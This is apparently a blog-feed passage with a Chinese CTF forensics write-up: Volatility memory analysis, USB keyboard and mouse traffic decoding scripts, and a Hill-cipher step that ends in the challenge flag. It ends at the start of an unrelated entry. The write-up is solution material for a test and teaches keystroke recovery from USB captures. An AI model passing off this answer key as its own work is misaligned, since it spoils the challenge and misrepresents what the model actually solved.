2019-09-04 14:28:15 UTC+0000                                 </span><br><span class="line">0x81528090 cmd.exe                1636   1428      1       34      0      0 2019-09-04 14:28:34 UTC+0000                                 </span><br><span class="line">0x815258b0 conime.exe             1676   1636      1       38      0      0 2019-09-04 14:28:34 UTC+0000                                 </span><br><span class="line">0x80ea56a8 wordpad.exe            1448   1428      4      113      0      0 2019-09-04 14:28:42 UTC+0000</span><br></pre></td></tr></table></figure><p>可以看到这里有两个值得关注的应用程序进程,分别是<strong>wordpad.exe</strong>、<strong>cmd.exe</strong>，但是我们还是没法得出出题人到底在干嘛，我们进行下一步</p><h4 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/session_0.WinSta0.Default.png" alt></p><p>好像还是不知道在干什么，只可以知道大概是开启了一个<strong>cmd</strong>，然后启动了一个类似<strong>wireshark</strong>的程序，也许正在抓包</p><h4 id="查看CMD命令"><a href="#查看CMD命令" class="headerlink" title="查看CMD命令"></a>查看CMD命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 460</span><br><span class="line">CommandHistory: 0x36e3850 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 1 LastAdded: 0 LastDisplayed: 0</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x5e0</span><br><span class="line">Cmd #0 @ 0x55d868: hill_matrix 3,2,2,9,7,7,6,4,9</span><br></pre></td></tr></table></figure><p>这里获得了一个重要的信息：<strong>hill_matrix 3,2,2,9,7,7,6,4,9</strong></p><h4 id="查看可疑文件"><a href="#查看可疑文件" class="headerlink" title="查看可疑文件"></a>查看可疑文件</h4><p>查看文档：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x000000000181c2c8      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\shdocvw.dll</span><br><span class="line">0x00000000019333d8      1      0 R--rw- \Device\HarddiskVolume1\WINDOWS\system32\mydocs.dll</span><br><span class="line">0x0000000001a4c658      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\shdocvw.dll</span><br></pre></td></tr></table></figure><p>查看图片：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tures\Administrator.bmp</span><br><span class="line">0x00000000017e02d0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\wlnotify.dll</span><br><span class="line">0x0000000001a44f28      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\Web\Wallpaper\Bliss.bmp</span><br><span class="line">0x0000000001aa0868      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\wlnotify.dll</span><br></pre></td></tr></table></figure><p>查看桌面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000000012d8ef8      1      0 R--r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\disk.zip</span><br><span class="line">0x00000000017e1f90      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\「开始」菜单\程序\附件\远程桌面连接.lnk</span><br><span class="line">0x000000000186f6a8      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\桌面</span><br><span class="line">0x000000000186f740      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</span><br></pre></td></tr></table></figure><p>可以发现桌面上存在着一个<strong>disk.zip</strong>，我们把它<strong>dump</strong>出来解压可以得到一个<strong>disk.img</strong>文件，解压我们可以直接得到一个流量抓包文件<strong>usb.pcapng</strong>，这样子验证了我们的猜想，当时的确是再用<strong>wireshark</strong>抓包，且还可知这是一个<strong>USB</strong>协议流量包</p><h2 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h2><p>把拿到的<strong>usb.pcapng</strong>文件拖进wireshark分析</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/QQ%E6%88%AA%E5%9B%BE20190910153112.png" alt></p><p>可以知道这的确是个USB流量，开始前，我们先介绍一些USB的基础知识。USB有不同的规格，以下是使用USB的三种方式：<strong>USB UART、USB HID、USB Memory</strong></p><p>UART或者Universal Asynchronous Receiver/Transmitter。这种方式下，设备只是简单的将USB用于接受和发射数据，除此之外就再没有其他通讯功能了。</p><p>HID是人性化的接口。这一类通讯适用于交互式，有这种功能的设备有：键盘，鼠标，游戏手柄和数字显示设备。</p><p>最后是USB Memory，或者说是数据存储。External HDD, thumb drive / flash drive,等都是这一类的。</p><p>其中使用的最广的不是USB HID 就是USB Memory了。</p><p>每一个USB设备（尤其是HID或者Memory）都有一个供应商ID（Vendor Id）和产品识别码（Product Id）。Vendor Id是用来标记哪个厂商生产了这个USB设备。Product Id用来标记不同的产品，他并不是一个特殊的数字，当然最好不同</p><p>我们分析可以知道，USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r example.pcap -T fields -e usb.capdata //如果想导入usbdata.txt文件中，后面加上参数：&gt;usbdata.txt</span><br></pre></td></tr></table></figure><p>USB数据包长度为八个字节，这里我们只关注USB流量中的键盘流量和鼠标流量</p><p>键盘数据包的数据长度为<strong>8</strong>个字节，击键信息集中在第<strong>3</strong>个字节，每次<strong>key stroke</strong>都会产生一个<strong>keyboard event usb packet</strong></p><p>鼠标数据包的数据长度为<strong>4</strong>个字节，第<strong>一</strong>个字节代表<strong>按键</strong>，当取<strong>0x00</strong>时，代表<strong>没有按键</strong>、为<strong>0x01</strong>时，代表按<strong>左键</strong>，为<strong>0x02</strong>时，代表当前按键为<strong>右键</strong>。第二个字节可以看成是一个<strong>signed   byte</strong>类型，其最高位为符号位，当这个值为<strong>正</strong>时，代表鼠标<strong>水平右移</strong>多少像素，为<strong>负</strong>时，代表<strong>水平左移</strong>多少像素。第三个字节与第二字节类似，代表<strong>垂直上下移动</strong>的偏移</p><blockquote><p>usb keyboard的映射表 根据这个映射表将第三个字节取出来，对应对照表得到解码</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/1100338-20180814105104990-181933183.png" alt></p></blockquote><h4 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h4><p>我们可以写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="comment"># 00:00:xx:....</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line">print(<span class="string">'output :n'</span> + output)</span><br></pre></td></tr></table></figure><p>如果直接从dat文件开始分析则脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line">presses = []</span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        python UsbKeyboardHacker.py data.pcap"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Tips : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        To use this python script , you must install the tshark first."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        You can use `sudo apt-get install tshark` to install it"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Author : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Angel_Kitty &lt;angelkitty6698@gmail.com&gt;"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        If you have any questions , please contact me by email."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Thank you for using."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">"tshark -r %s -T fields -e usb.capdata &gt; %s"</span> % (pcapFilePath, DataFileName))</span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span>:</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"20"</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span>:</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Found : %s"</span> % (result)</span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">"rm ./%s"</span> % (DataFileName))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行后我们得到一串信息：<strong>AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE</strong></p><h4 id="鼠标流量分析"><a href="#鼠标流量分析" class="headerlink" title="鼠标流量分析"></a>鼠标流量分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nums = [] </span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </span><br><span class="line">     <span class="keyword">continue</span> </span><br><span class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </span><br><span class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">    x -= <span class="number">256</span> </span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">    y -= <span class="number">256</span> </span><br><span class="line">posx += x </span><br><span class="line">posy += y </span><br><span class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </span><br><span class="line">    <span class="keyword">print</span> posx , posy </span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><h2 id="密码学分析"><a href="#密码学分析" class="headerlink" title="密码学分析"></a>密码学分析</h2><p>经过多种密码尝试最终得出这是一个希尔密码，其实特征也很明显，有一个矩阵还有一个密文，这里推介一个希尔密码的在线加解密网站：<a href="https://www.dcode.fr/hill-cipher" target="_blank" rel="noopener">https://www.dcode.fr/hill-cipher</a></p><p>我们得到一串信息：<strong>AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE</strong></p><p>在希尔密码中：</p><p><strong>ALPHABET (A=0) ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong></p><p><strong>ALPHABET (A=1) ZABCDEFGHIJKLMNOPQRSTUVWXY</strong></p><p>而这题我们获得了十个A则可知加密方式为：</p><p><strong>ALPHABET (A=10) QRSTUVWXYZABCDEFGHIJKLMNOP</strong></p><p>我们之前获得了一个重要的信息：<strong>hill_matrix 3,2,2,9,7,7,6,4,9</strong></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/QQ%E6%88%AA%E5%9B%BE20190910161715.png" alt></p><p>解密可以得到：<strong>ZKNNTCUPZXOU</strong>，这题有一个小坑应全部转为小写才是正确的flag，故真正的flag应为：zknntcupzxou</p><blockquote><p>参考文章</p><ol><li>深入理解USB流量数据包的抓取与分析【<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html】" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html】</a></li><li>CTF MISC-USB流量分析出题记录【<a href="https://www.cnblogs.com/hackxf/p/10670844.html】" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10670844.html】</a></li></ol></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>X86和X87汇编指令大全</title>
      <link href="/2019/09/09/X86%E2%95%91%E2%95%90X87%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%93%E2%95%95%E2%94%B4%CE%B5%E2%94%A4%E2%89%A4%E2%95%9A%C2%BD/"/>
      <url>/2019/09/09/X86%E2%95%91%E2%95%90X87%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%93%E2%95%95%E2%94%B4%CE%B5%E2%94%A4%E2%89%A4%E2%95%9A%C2%BD/</url>
      
